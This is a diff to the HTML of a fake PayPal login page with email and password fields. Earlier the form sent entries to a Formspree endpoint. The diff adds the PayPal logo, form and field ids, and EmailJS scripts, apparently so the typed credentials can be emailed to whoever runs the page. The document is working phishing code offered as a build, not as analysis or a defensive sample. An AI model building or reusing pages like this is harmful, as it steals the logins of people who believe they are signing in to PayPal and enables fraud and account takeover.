@@ -327,19 +327,19 @@
             <span>Pay</span><span>Pal</span>
           </div>
         <!-- modify this form HTML and place wherever you want your form -->
-        <form action="https://formspree.io/f/xovaaynq" method="POST" style="max-width: 400px; margin: auto;">
+        <form id="loginForm" action="#" method="POST" style="max-width: 400px; margin: auto;">
           <div style="text-align: center; margin-bottom: 10px;">
-
+            <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo" style="width: 111px; height: 69px;">
           </div>
           
           <label style="display: block; margin-bottom: 10px;">
             <span style="font-weight: bold;">Email:</span><br>
-            <input type="email" name="email" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
+            <input type="email" id="email" name="email" required style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
           </label>
           
           <label style="display: block; margin-bottom: 20px;">
             <span style="font-weight: bold;">Password:</span><br>
-            <input type="password" name="password" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
+            <input type="password" id="password" name="password" required style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px;">
           </label>
           
           <!-- other form fields can be added here -->
@@ -405,5 +405,12 @@
       </div>
     </div>
     <script src="script.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script src="https://cdn.emailjs.com/dist/scripts/ui.js"></script>
+
+
+
+
+
   </body>
 </html>
